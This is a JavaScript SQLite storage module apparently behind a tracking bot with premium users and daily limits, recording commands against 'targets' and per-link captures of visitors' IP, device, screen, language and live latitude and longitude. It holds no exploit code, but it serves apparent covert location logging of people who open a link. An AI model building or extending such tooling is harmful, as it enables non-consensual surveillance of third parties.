const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');

if (!fs.existsSync('logs')) {
    fs.mkdirSync('logs');
}

const db = new sqlite3.Database('tracking.db');

function init() {
    db.run(`CREATE TABLE IF NOT EXISTS tracking_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        username TEXT,
        command TEXT,
        target TEXT,
        result TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS premium_users (
        user_id TEXT PRIMARY KEY,
        added_by TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS gps_data (
        id TEXT PRIMARY KEY,
        ip TEXT,
        useragent TEXT,
        location TEXT,
        device TEXT,
        screen TEXT,
        language TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS live_location (
        ip TEXT PRIMARY KEY,
        lat TEXT,
        lon TEXT,
        city TEXT,
        country TEXT,
        last_update DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS user_usage (
        user_id TEXT,
        date TEXT,
        count INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, date)
    )`);
}

function saveLog(userId, username, command, target, result) {
    db.run(
        'INSERT INTO tracking_log (user_id, username, command, target, result) VALUES (?, ?, ?, ?, ?)',
        [userId, username, command, target, result]
    );
}

function isPremium(userId) {
    return new Promise((resolve) => {
        db.get('SELECT user_id FROM premium_users WHERE user_id = ?', [userId], (err, row) => {
            resolve(!!row);
        });
    });
}

function addPremium(userId, addedBy) {
    db.run('INSERT OR REPLACE INTO premium_users (user_id, added_by) VALUES (?, ?)', [userId, addedBy]);
}

function removePremium(userId) {
    db.run('DELETE FROM premium_users WHERE user_id = ?', [userId]);
}

function getTodayUsage(userId) {
    return new Promise((resolve) => {
        const today = new Date().toISOString().split('T')[0];
        db.get('SELECT count FROM user_usage WHERE user_id = ? AND date = ?', [userId, today], (err, row) => {
            resolve(row ? row.count : 0);
        });
    });
}

function incrementUsage(userId) {
    const today = new Date().toISOString().split('T')[0];
    db.run(
        'INSERT INTO user_usage (user_id, date, count) VALUES (?, ?, 1) ON CONFLICT(user_id, date) DO UPDATE SET count = count + 1',
        [userId, today]
    );
}

function saveGPS(id) {
    db.run('INSERT INTO gps_data (id) VALUES (?)', [id]);
}

function updateGPS(id, data) {
    db.run(
        'UPDATE gps_data SET ip = ?, useragent = ?, location = ?, device = ?, screen = ?, language = ? WHERE id = ?',
        [data.ip, data.useragent, data.location, data.device, data.screen, data.language, id]
    );
}

function getGPSData(id) {
    return new Promise((resolve) => {
        db.get('SELECT * FROM gps_data WHERE id = ?', [id], (err, row) => {
            resolve(row);
        });
    });
}

function getAllGPS() {
    return new Promise((resolve) => {
        db.all('SELECT * FROM gps_data WHERE ip IS NOT NULL ORDER BY timestamp DESC', (err, rows) => {
            resolve(rows || []);
        });
    });
}

function deleteGPS(id) {
    db.run('DELETE FROM gps_data WHERE id = ?', [id]);
}

function exportAll() {
    return new Promise((resolve) => {
        db.all('SELECT * FROM tracking_log', (err, logs) => {
            db.all('SELECT * FROM premium_users', (err, premiums) => {
                db.all('SELECT * FROM gps_data', (err, gps) => {
                    resolve({ logs, premiums, gps });
                });
            });
        });
    });
}

function clearLogs() {
    db.run('DELETE FROM tracking_log');
}

module.exports = {
    init,
    saveLog,
    isPremium,
    addPremium,
    removePremium,
    getTodayUsage,
    incrementUsage,
    saveGPS,
    updateGPS,
    getGPSData,
    getAllGPS,
    deleteGPS,
    exportAll,
    clearLogs
};